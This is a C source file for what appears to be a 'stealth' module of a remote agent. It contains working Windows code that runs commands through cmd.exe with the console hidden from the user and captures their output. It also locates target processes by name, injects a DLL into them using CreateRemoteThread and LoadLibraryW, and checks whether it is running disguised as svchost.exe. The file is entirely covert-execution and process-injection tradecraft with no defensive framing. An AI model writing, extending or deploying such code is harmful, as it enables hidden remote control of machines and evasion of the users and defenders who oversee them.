/*
 * MeshAgent Stealth - Hidden CMD Execution
 *
 * Provides in-memory command execution with hidden console windows
 * and full output capture without creating visible processes.
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "stealth.h"

/**
 * Execute CMD command with completely hidden window and output capture
 * This creates a cmd.exe process but with SW_HIDE so it's invisible to users
 */
BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize)
{
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = {0};
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmdLine[4096];
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    BOOL success = FALSE;

    if (!command || !output || outputSize == 0)
    {
        return FALSE;
    }

    // Initialize output buffer
    memset(output, 0, outputSize);

    // Setup security attributes for pipe inheritance
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create anonymous pipe for output capture
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        return FALSE;
    }

    // Make sure read handle is NOT inherited
    if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    // Setup STARTUPINFO to redirect stdout/stderr and hide window
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;  // CRITICAL: Hide the console window

    // Build command line with cmd.exe wrapper
    if (sprintf_s(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command) < 0)
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    // Create the hidden CMD process
    if (!CreateProcessA(
        NULL,                                    // Application name
        cmdLine,                                 // Command line
        NULL,                                    // Process security attributes
        NULL,                                    // Thread security attributes
        TRUE,                                    // Inherit handles (for pipe)
        CREATE_NO_WINDOW | CREATE_NEW_CONSOLE,  // Creation flags - hidden window
        NULL,                                    // Environment
        NULL,                                    // Current directory
        &si,                                     // Startup info
        &pi))                                    // Process information
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    // Close write pipe in parent process (child process has a copy)
    CloseHandle(hWritePipe);
    hWritePipe = NULL;

    // Read output from pipe
    while (totalRead < (outputSize - 1))
    {
        if (!ReadFile(hReadPipe, output + totalRead,
                     (DWORD)(outputSize - totalRead - 1), &bytesRead, NULL))
        {
            break;  // End of output or error
        }

        if (bytesRead == 0)
        {
            break;  // No more data
        }

        totalRead += bytesRead;
    }

    // Null-terminate the output
    output[totalRead] = '\0';

    // Wait for process to complete (with timeout)
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);  // 30 second timeout

    // Get exit code
    DWORD exitCode = 0;
    if (waitResult == WAIT_OBJECT_0)
    {
        GetExitCodeProcess(pi.hProcess, &exitCode);
        success = (exitCode == 0);  // Success if exit code is 0
    }
    else
    {
        // Timeout or error - terminate the process
        TerminateProcess(pi.hProcess, 1);
        success = FALSE;
    }

    // Cleanup
    if (hReadPipe) CloseHandle(hReadPipe);
    if (hWritePipe) CloseHandle(hWritePipe);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    return (totalRead > 0);  // Return TRUE if we got any output
}

/**
 * Find a process by name
 */
DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD foundPid = 0;

    if (!processName)
    {
        return 0;
    }

    // Take snapshot of all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Get first process
    if (Process32FirstW(hSnapshot, &pe32))
    {
        do
        {
            // Check if process name matches
            if (_wcsicmp(pe32.szExeFile, processName) == 0)
            {
                foundPid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return foundPid;
}

/**
 * Inject DLL into target process
 * This is a basic implementation using CreateRemoteThread
 */
BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath)
{
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    size_t dllPathSize = 0;

    if (!dllPath || processId == 0)
    {
        return FALSE;
    }

    dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        processId
    );

    if (!hProcess)
    {
        return FALSE;
    }

    // Allocate memory in target process for DLL path
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPathSize,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write DLL path to target process memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, dllPathSize, NULL))
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get address of LoadLibraryW
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create remote thread to load DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                  pRemoteBuf, 0, NULL);
    if (hThread)
    {
        // Wait for DLL to load (with timeout)
        WaitForSingleObject(hThread, 5000);
        success = TRUE;
        CloseHandle(hThread);
    }

    // Cleanup
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return success;
}

/**
 * Check if currently running inside svchost.exe
 */
BOOL Stealth_IsRunningSvchost(void)
{
    WCHAR exePath[MAX_PATH] = {0};

    // Get the path of the current process
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0)
    {
        return FALSE;
    }

    // Extract just the filename
    WCHAR* exeName = wcsrchr(exePath, L'\\');
    if (!exeName)
    {
        exeName = exePath;
    }
    else
    {
        exeName++;  // Skip the backslash
    }

    // Check if we're running as svchost.exe
    return (_wcsicmp(exeName, L"svchost.exe") == 0);
}
